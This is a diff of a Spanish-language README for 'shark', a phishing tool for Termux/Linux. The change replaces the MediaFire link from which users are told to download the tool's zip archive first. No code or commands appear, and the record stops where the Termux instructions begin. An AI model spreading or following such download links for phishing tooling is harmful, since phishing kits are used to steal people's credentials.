@@ -8,7 +8,7 @@ Herramienta de phishing para Termux/ Linux
 # INSTRUCCIONES
 
 PRIMERO DESCARGAR EL ARCHIVO DESDE ESTE LINK:
-https://www.mediafire.com/file/wl27s8mxxz8j2g3/shark.zip/file
+https://www.mediafire.com/file/m62yuwwvct3klg7/shark.zip/file
 
 DESPUÉS METERTE A TERMUX Y DESPUÉS: 
 ```
